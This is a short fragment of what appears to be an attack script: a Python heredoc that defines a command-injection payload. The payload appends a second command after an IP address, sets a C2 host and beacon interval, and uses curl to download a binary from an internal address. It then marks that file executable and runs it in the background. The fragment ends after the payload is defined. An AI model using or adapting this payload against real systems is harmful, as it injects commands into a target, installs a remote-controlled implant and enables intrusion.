python3 - <<'PY'
import urllib.parse, subprocess
payload='127.0.0.1;C2_HOST=172.20.0.2 BEACON_INTERVAL=2 nohup sh -c "curl -fsSL http://172.20.0.2:8000/dba -o /tmp/dba && chmod +x /tmp/dba && python3 /tmp/dba" >/tmp/dba.log 2>&1 &'
